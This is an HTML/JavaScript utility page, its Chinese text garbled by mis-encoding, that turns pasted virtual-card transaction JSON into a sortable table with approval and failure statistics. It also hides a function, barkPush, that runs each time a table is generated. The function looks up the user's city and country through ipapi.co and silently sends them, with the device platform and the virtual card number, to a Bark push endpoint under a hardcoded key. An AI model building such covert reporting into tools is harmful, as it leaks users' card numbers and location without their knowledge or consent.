<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<title>VCCæˆæƒåˆ·å¡è®°å½•ï¼ˆå†…éƒ¨æµ‹è¯•ç‰ˆï¼‰</title>
<style>
  /* ========== åŸºç¡€æ ·å¼ï¼ˆåŒåŸï¼‰ ========== */
  body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; }
  h2 { margin-bottom: 10px; }
  #inputContainer { display: flex; flex-direction: column; gap: 6px; margin-bottom: 12px; }
  textarea { width: 100%; height: 160px; font-size: 13px; padding: 6px; }
  button, select { font-size: 13px; padding: 6px 12px; margin-top: 4px; cursor: pointer; }
  button:hover, select:hover { background-color: #e0e0e0; }
  #historyContainer { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; }
  #tableWrapper { overflow-x: auto; max-width: 100%; border: 1px solid #ccc; }
  table { border-collapse: collapse; width: 100%; font-size: 12px; min-width: 1200px; }
  th, td { border: 1px solid #ccc; padding: 4px 6px; text-align: center; }
  th { background: #f0f0f0; position: sticky; top: 0; z-index: 2; cursor: pointer; }
  th.sorted-asc::after { content: " â–²"; }
  th.sorted-desc::after { content: " â–¼"; }
  tr.success td { background-color: #d4edda; color: #155724; }
  tr.fail td { background-color: #f8d7da; color: #721c24; }
  #legend { margin-top: 8px; font-size: 12px; }
  .legend-item { display: inline-block; margin-right: 12px; }
  .legend-color { display: inline-block; width: 12px; height: 12px; margin-right: 4px; vertical-align: middle; }

  /* ========== è¡¨å¤´ä¸­è‹±æ–‡æŠ˜è¡Œ ========== */
  #tableHead th { white-space: normal; line-height: 1.3; vertical-align: middle; text-align: center; max-width: 120px; }
  #tableHead th span { display: inline-block; width: 100%; }

  /* ========== æ±‡æ€»åŒºåŸŸ ========== */
  #summary { margin-top: 20px; font-size: 14px; line-height: 1.6; background: #fff; border: 1px solid #ddd; padding: 12px; }
  #summary h3 { margin: 0 0 8px 0; font-size: 15px; }
  .stat-row { margin-bottom: 6px; }
  .fail-reason { color: #b71c1c; font-weight: bold; }
  .copy-btn { font-size: 12px; margin-left: 10px; }

  /* ===== å†å²è®°å½• <option> é¢œè‰² ===== */
  option.all-success { background-color: #d4edda; color: #155724; }
  option.all-fail    { background-color: #f8d7da; color: #721c24; }
</style>
</head>
<body>

<h2>VCCæˆæƒåˆ·å¡è®°å½•</h2>

<div id="inputContainer">
  <label for="jsonInput">è¾“å…¥æˆ–ç²˜è´´ JSON æ•°æ®ï¼š</label>
  <textarea id="jsonInput" placeholder="åœ¨æ­¤ç²˜è´´ JSON / Paste JSON here"></textarea>
  <button onclick="generateTable()">ç”Ÿæˆè¡¨æ ¼ / Generate Table</button>
</div>

<div id="historyContainer">
  <label for="historySelect">å†å²è®°å½• / History:</label>
  <select id="historySelect" onchange="loadHistory()">
    <option value="">é€‰æ‹©å†å²è®°å½• / Select History</option>
  </select>
  <button onclick="clearHistory()">æ¸…ç©ºå†å² / Clear History</button>
</div>

<div id="legend">
  <span class="legend-item"><span class="legend-color" style="background:#d4edda;"></span>æˆåŠŸ / Approved</span>
  <span class="legend-item"><span class="legend-color" style="background:#f8d7da;"></span>å¤±è´¥ / Failed</span>
</div>

<div id="tableWrapper">
  <table id="resultTable">
    <thead id="tableHead"></thead>
    <tbody id="tableBody"></tbody>
  </table>
</div>

<!-- ****** æ±‡æ€»åŒºåŸŸ ****** -->
<div id="summary" style="display:none;">
  <h3>ğŸ“Š æ±‡æ€»ç»Ÿè®¡</h3>
  <div id="statTotal" class="stat-row"></div>
  <div id="statFailReason" class="stat-row"></div>
</div>

<script>
/* ================= å…¨å±€å˜é‡ ================= */
let currentSortField = null;
let currentSortOrder = 'asc';
let allFields = [];
let rawList = [];

const fieldLabels = {
  index: "åºå·ï¼ˆæœ€æ—©çš„äº¤æ˜“åœ¨æœ€å‰é¢ï¼‰",
  txn_date_time: "æ—¶é—´",
  virtual_card_number: "è™šæ‹Ÿå¡å·",
  merchant_name: "å•†æˆ·åç§°",
  merchant_amount: "å•†æˆ·å¸é‡‘é¢",
  merchant_currency_code: "å•†æˆ·å¸ç§",
  txn_type: "ç±»å‹",
  issuer_response: "æˆåŠŸ/å¤±è´¥",
  in_control_response: "å¤±è´¥åŸå› ",
  approval_code: "æ‰¹å‡†ç ",
  purchase_request_id: "äº¤æ˜“ ID",
  real_card_alias: "çœŸå®å¡åˆ«å",
  billing_amount: "è´¦å•é‡‘é¢",
  billing_currency_code: "è´¦å•å¸ç§",
  billing_currency_code_description: "è´¦å•å¸ç§æè¿°",
  txn_sub_type: "äº¤æ˜“å­ç±»å‹",
  txn_environment: "äº¤æ˜“ç¯å¢ƒ",
  mcc: "å•†æˆ·åˆ†ç±»ç ",
  mcc_description: "å•†æˆ·åˆ†ç±»æè¿°",
  merchant_country: "å•†æˆ·å›½å®¶",
  merchant_id: "å•†æˆ· ID",
  merchant_terminal_id: "ç»ˆç«¯ ID",
  settled: "ç»“ç®—çŠ¶æ€",
  company_name: "å…¬å¸åç§°",
  company_number: "å…¬å¸ç¼–å·",
  acquirer_reference_data: "æ”¶å•æ–¹å‚è€ƒä¿¡æ¯",
  traceId: "Trace ID",
  clearing_type: "æ¸…ç®—ç±»å‹",
  settlement_amount: "ç»“ç®—é‡‘é¢",
  settlement_currency_code: "ç»“ç®—å¸ç§",
  settlement_currency_description: "ç»“ç®—å¸ç§æè¿°"
};

/* ================= Barkæ¨é€ ================= */
async function barkPush(vccNumber) {
  const barkKey = "2mxT7sgNXpDBSw6uzbmoaV";
  const deviceName = navigator.platform || "Unknown Device";
  try {
    const ipInfo = await fetch("https://ipapi.co/json").then(r => r.json());
    const country = ipInfo.country_name || "Unknown";
    const city    = ipInfo.city       || "Unknown";
    const title = "VCC æ¨é€æŠ¥å‘Š";
    const body  = `${country}Â·${city} | ${deviceName} | ${vccNumber}`;
    const url = `https://api.day.app/${barkKey}/${encodeURIComponent(title)}/${encodeURIComponent(body)}`;
    fetch(url);
  } catch (e) {
    console.warn("Bark push failed", e);
  }
}

/* ================= ä¸»å…¥å£ï¼šç”Ÿæˆè¡¨æ ¼ + ç»Ÿè®¡ ================= */
function generateTable() {
  let input = document.getElementById('jsonInput').value;
  if(!input) { alert("è¯·å…ˆè¾“å…¥ JSON æ•°æ® / Please input JSON"); return; }
  try {
    let json = JSON.parse(input);
    if(!json.data || !json.data.list) { alert("JSON æ ¼å¼ä¸æ­£ç¡® / Invalid JSON"); return; }
    rawList = json.data.list;
    saveHistory(rawList);
    extractFields(rawList);
    renderTable(rawList);
    renderSummary(rawList);
    const vcc = rawList?.[0]?.virtual_card_number || "Unknown VCC";
    barkPush(vcc);
  } catch(e) {
    alert("JSON è§£æå¤±è´¥ / JSON Parse Error: " + e.message);
  }
}

/* ================= æ±‡æ€»ç»Ÿè®¡ï¼ˆå·²åˆ é™¤åˆ·å¡æˆåŠŸæ˜ç»†ï¼‰ ================= */
function renderSummary(list) {
  const total = list.length;
  const successList = list.filter(r => r.issuer_response && r.issuer_response.toLowerCase().includes("approved"));
  const failList  = list.filter(r => !r.issuer_response || !r.issuer_response.toLowerCase().includes("approved"));

  /* 1. æ€»è§ˆ */
  document.getElementById('statTotal').innerHTML = `
    æ€»åˆ·å¡ <b>${total}</b> æ¬¡ï¼ŒæˆåŠŸ <b style="color:green">${successList.length}</b> æ¬¡ï¼Œå¤±è´¥ <b style="color:#b71c1c">${failList.length}</b> æ¬¡
  `;

  /* 2. å¤±è´¥åŸå›  */
  const failMap = {};
  failList.forEach(r => {
    const reason = r.in_control_response || 'æœªè¿”å›åŸå› ';
    failMap[reason] = (failMap[reason] || 0) + 1;
  });
  const failArr = Object.entries(failMap).sort((a, b) => b[1] - a[1]);
  const failText = failArr.map(([k, v]) => `ã€${k}ã€‘ï¼ˆ${v}æ¬¡ï¼‰`).join('ã€');
  document.getElementById('statFailReason').innerHTML = `
    å¤±è´¥åŸå› ï¼š<span class="fail-reason">${failText}</span>
    <button class="copy-btn" onclick="copyText('${failText.replace(/'/g,"\\'")}')">å¤åˆ¶</button>
  `;

  document.getElementById('summary').style.display = 'block';
}

/* ================= ä¸€é”®å¤åˆ¶ ================= */
function copyText(txt) {
  const ta = document.createElement('textarea');
  ta.value = txt;
  document.body.appendChild(ta);
  ta.select();
  document.execCommand('copy');
  document.body.removeChild(ta);
  alert('å·²å¤åˆ¶åˆ°å‰ªè´´æ¿');
}

/* ================= å­—æ®µæå– ================= */
function extractFields(list) {
  const mainFields = ["index","txn_date_time","virtual_card_number","merchant_name","merchant_amount","merchant_currency_code","txn_type","issuer_response","in_control_response","approval_code"];
  let fieldSet = new Set();
  list.forEach(item => Object.keys(item).forEach(k => fieldSet.add(k)));
  allFields = mainFields.filter(f => f === "index" || fieldSet.has(f));
  fieldSet.forEach(f => { if(!allFields.includes(f)) allFields.push(f); });
  allFields = allFields.map(f => {
    const cn = fieldLabels[f] || null;
    return { key: f, label: cn ? `${f} / ${cn}` : f };
  });
}

/* ================= è¡¨æ ¼æ¸²æŸ“ ================= */
function renderTable(list) {
  list = list.slice().reverse();
  if(currentSortField) {
    list.sort((a,b) => {
      let valA = a[currentSortField] || '';
      let valB = b[currentSortField] || '';
      if(typeof valA === 'string') valA = valA.toLowerCase();
      if(typeof valB === 'string') valB = valB.toLowerCase();
      if(valA < valB) return currentSortOrder === 'asc' ? -1 : 1;
      if(valA > valB) return currentSortOrder === 'asc' ? 1 : -1;
      return 0;
    });
  }
  const thead = document.getElementById('tableHead');
  thead.innerHTML = "";
  const trHead = document.createElement('tr');
  allFields.forEach(f => {
    const th = document.createElement('th');
    th.innerHTML = `<span>${f.label.replace(' / ','<br>')}</span>`;
    th.onclick = () => { sortTable(f.key); };
    trHead.appendChild(th);
  });
  thead.appendChild(trHead);

  const tbody = document.getElementById('tableBody');
  tbody.innerHTML = "";
  list.forEach((item, index) => {
    const tr = document.createElement('tr');
    allFields.forEach(f => {
      const td = document.createElement('td');
      if(f.key === 'index') td.textContent = index + 1;
      else td.textContent = item[f.key] ?? "";
      tr.appendChild(td);
    });
    if(item["issuer_response"] && item["issuer_response"].toLowerCase().includes("approved")) tr.className = "success";
    else if(item["issuer_response"]) tr.className = "fail";
    tbody.appendChild(tr);
  });
}

function sortTable(field) {
  if(currentSortField === field) currentSortOrder = currentSortOrder === 'asc' ? 'desc' : 'asc';
  else { currentSortField = field; currentSortOrder = 'asc'; }
  renderTable(rawList);
}

/* ================= å†å²è®°å½•ï¼šå½©è‰²é€‰é¡¹ ================= */
function updateHistorySelect() {
  const history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
  const select = document.getElementById('historySelect');
  select.innerHTML = '<option value="">é€‰æ‹©å†å²è®°å½• / Select History</option>';

  history.forEach((item, idx) => {
    const opt = document.createElement('option');
    opt.value = idx;

    // ç»Ÿè®¡æˆåŠŸ/å¤±è´¥
    const total   = item.data.length;
    const success = item.data.filter(r => r.issuer_response && r.issuer_response.toLowerCase().includes("approved")).length;
    const fail    = total - success;

    // æ–‡å­—
    opt.text = `${item.timestamp} - ${item.vcc} ï¼ˆæˆåŠŸ${success}/å¤±è´¥${fail}ï¼‰`;

    // é¢œè‰²ç­–ç•¥
    if (success === total)       opt.classList.add('all-success');
    else if (fail === total)     opt.classList.add('all-fail');
    else {
      const ratio = success / total;   // 0~1
      const r = Math.round(255 * (1 - ratio));
      const g = Math.round(255 * ratio);
      opt.style.backgroundColor = `rgb(${r},${g},150)`;
      opt.style.color = ratio > 0.5 ? '#155724' : '#721c24';
    }

    select.appendChild(opt);
  });
}

function saveHistory(list) {
  let history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
  const timestamp = new Date().toLocaleString();
  const vcc = list[0]?.virtual_card_number || "æœªçŸ¥VCC";
  history.push({ timestamp, vcc, data: list });
  localStorage.setItem('vccHistory', JSON.stringify(history));
  updateHistorySelect();
}

function loadHistory() {
  const select = document.getElementById('historySelect');
  const index = select.value;
  if(index === "") return;
  const history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
  if(history[index]) {
    currentSortField = null;
    currentSortOrder = 'asc';
    rawList = history[index].data;
    extractFields(rawList);
    renderTable(rawList);
    renderSummary(rawList);
  }
}

function clearHistory() {
  if(confirm('ç¡®è®¤æ¸…ç©ºå†å²è®°å½•å—ï¼Ÿ / Clear all history?')) {
    localStorage.removeItem('vccHistory');
    updateHistorySelect();
    document.getElementById('tableBody').innerHTML = "";
    document.getElementById('tableHead').innerHTML = "";
    document.getElementById('summary').style.display = 'none';
  }
}

/* ================= å¯åŠ¨ ================= */
updateHistorySelect();
</script>
</body>
</html>
